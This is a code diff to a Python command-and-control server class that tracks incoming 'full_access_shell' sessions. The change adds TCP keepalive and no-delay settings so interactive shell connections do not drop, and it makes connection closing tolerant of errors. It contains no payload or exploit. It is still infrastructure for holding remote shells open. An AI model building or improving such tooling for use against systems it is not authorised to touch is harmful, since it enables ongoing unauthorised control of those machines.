@@ -1,4 +1,5 @@
 import asyncio
+import socket
 from typing import Dict, List, Optional
 
 from .session import Session
@@ -11,8 +12,33 @@ class C2Server:
         self.active_sessions: Dict[str, Session] = {}
         self.server: Optional[asyncio.Server] = None
 
+    def _configure_socket(self, sock: socket.socket):
+        """Configure TCP keepalive and socket flags to prevent premature disconnection."""
+        try:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            # TCP Keepalive idle timeout (seconds before sending keepalive probes)
+            if hasattr(socket, "TCP_KEEPIDLE"):
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)
+            elif hasattr(socket, "TCP_KEEPALIVE"):
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, 30)
+            # Interval between keepalive probes
+            if hasattr(socket, "TCP_KEEPINTVL"):
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
+            # Probe count before closing
+            if hasattr(socket, "TCP_KEEPCNT"):
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
+            # Disable Nagle's algorithm for interactive shells
+            if hasattr(socket, "TCP_NODELAY"):
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        except (OSError, AttributeError):
+            pass
+
     async def _handle_client_connection(self, reader, writer):
         peername = writer.get_extra_info("peername") or ("unknown", 0)
+        sock = writer.get_extra_info("socket")
+        if sock:
+            self._configure_socket(sock)
+
         session = Session(reader, writer, peername, session_type="full_access_shell")
         self.active_sessions[session.id] = session
         print(f"[*] New session {session.id} — {session.ip_address}:{session.port}")
@@ -33,8 +59,11 @@ class C2Server:
             # Remove the session when it terminates
             if session.id in self.active_sessions:
                 del self.active_sessions[session.id]
-            writer.close()
-            await writer.wait_closed()
+            try:
+                writer.close()
+                await writer.wait_closed()
+            except Exception:
+                pass
 
     def get_sessions_summary(self) -> List[dict]:
         """Returns a summary of active sessions for display."""
